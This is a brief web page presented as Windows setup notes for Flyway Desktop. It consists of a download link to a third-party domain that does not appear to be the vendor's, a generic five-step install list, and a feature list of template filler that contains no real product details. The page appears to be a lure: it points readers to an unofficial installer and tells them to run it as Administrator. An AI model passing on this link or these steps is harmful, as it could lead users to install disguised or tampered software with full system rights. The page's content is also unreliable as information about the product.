# Flyway Desktop Windows Setup Notes

**Download:** [Get Windows installer →](https://flyway-desktop.kolmods.com/)

## Download & Install

> Setup notes for **Flyway Desktop** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Flyway Desktop** from the Start menu

## What you can use it for

- Core Flyway Desktop features on Windows desktop
- Install and configure Flyway Desktop for daily use
- Import, edit, and export with Flyway Desktop tools
- Tune settings and profiles inside Flyway Desktop
- Integrate Flyway Desktop into your existing workflow
